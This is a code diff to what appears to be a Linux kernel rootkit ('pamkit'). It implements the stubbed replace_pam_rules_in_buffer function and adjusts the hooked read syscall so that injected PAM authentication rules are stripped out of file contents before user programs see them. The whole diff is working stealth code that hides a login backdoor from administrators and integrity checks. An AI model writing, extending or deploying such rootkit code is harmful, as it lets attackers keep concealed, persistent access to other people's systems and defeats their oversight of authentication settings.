@@ -133,8 +133,48 @@ error_out_2:
 static long
 replace_pam_rules_in_buffer(char __user *buffer, const size_t read_bytes, const disk_mod_config_t *disk_mod_config)
 {
-    // TODO
-    return -1;
+    char *modified_usr_buffer;
+    char *mod_rule_start;
+    size_t mod_offset;
+    size_t trailing_chars;
+    size_t new_size;
+
+    if (read_bytes < (disk_mod_config->modifications_len - 1)) {
+        return read_bytes;
+    }
+
+    modified_usr_buffer = (char *) kzalloc(read_bytes + 1, GFP_KERNEL);
+    if (!modified_usr_buffer) {
+        prerr_ratelimited("Failed to allocate memory for 'modified_usr_buffer' (pid=%d, name=%s)", task_pid_nr(current), current->comm);
+        return -ENOMEM;
+    }
+
+    if (copy_from_user(modified_usr_buffer, buffer, read_bytes)) {
+        prerr_ratelimited("Failed to copy user buffer to kernel buffer (pid=%d, name=%s)", task_pid_nr(current), current->comm);
+        kfree(modified_usr_buffer);
+        return -EFAULT;
+    }
+
+    mod_rule_start = strstr(modified_usr_buffer, disk_mod_config->modifications);
+    if (!mod_rule_start) {
+        kfree(modified_usr_buffer);
+        return read_bytes;
+    }
+
+    mod_offset = mod_rule_start - modified_usr_buffer;
+    trailing_chars = read_bytes - (mod_offset + disk_mod_config->modifications_len + 1);
+
+    memmove(mod_rule_start, mod_rule_start + disk_mod_config->modifications_len + 1, trailing_chars);
+
+    new_size = read_bytes - (disk_mod_config->modifications_len + 1);
+    if (copy_to_usr(buffer, modified_usr_buffer, new_size)) {
+        prerr_ratelimited("Failed to copy the buffer with the PAM rule modifications removed into the user buffer");
+        kfree(modified_usr_buffer);
+        return -EFAULT;
+    }
+
+    kfree(modified_usr_buffer);
+    return new_size;
 }
 
 static long
@@ -212,9 +252,9 @@ SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
     if (unlikely(disk_mod_config)) {
 
         #ifdef PAMKIT_PTREGS_STUBS
-        ret = replace_pam_rules_in_buffer(SECOND_ARG(pt_regs, char __user *), THIRD_ARG(pt_regs, size_t), disk_mod_config);
+        ret = replace_pam_rules_in_buffer(SECOND_ARG(pt_regs, char __user *), ret, disk_mod_config);
         #else
-        ret = replace_pam_rules_in_buffer(buf, count, disk_mod_config);
+        ret = replace_pam_rules_in_buffer(buf, ret, disk_mod_config);
         #endif
     }
 
